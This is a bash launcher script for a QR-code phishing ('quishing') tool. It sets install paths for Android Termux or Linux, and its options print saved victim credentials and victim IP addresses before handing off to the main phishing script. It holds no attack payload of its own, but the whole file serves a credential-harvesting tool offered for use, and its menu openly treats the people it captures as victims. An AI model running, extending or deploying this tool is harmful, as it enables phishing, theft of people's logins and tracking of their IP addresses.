#!/bin/bash

# https://github.com/m13hack/quishing-tool

if [[ $(uname -o) == *'Android'* ]]; then
    QUISHING_ROOT="/data/data/com.termux/files/usr/opt/quishing-tool"
else
    export QUISHING_ROOT="/opt/quishing-tool"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
    echo "To run Quishing Tool type \`quishing-tool\` in your cmd"
    echo
    echo "Help:"
    echo " -h | help : Print this menu & Exit"
    echo " -c | auth : View Saved Credentials"
    echo " -i | ip   : View Saved Victim IP"
    echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
    cat $QUISHING_ROOT/auth/usernames.dat 2> /dev/null || { 
        echo "No Credentials Found!"
        exit 1
    }
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
    cat $QUISHING_ROOT/auth/ip.txt 2> /dev/null || {
        echo "No Saved IP Found!"
        exit 1
    }
else
    cd $QUISHING_ROOT
    bash ./quishing-tool.sh
fi
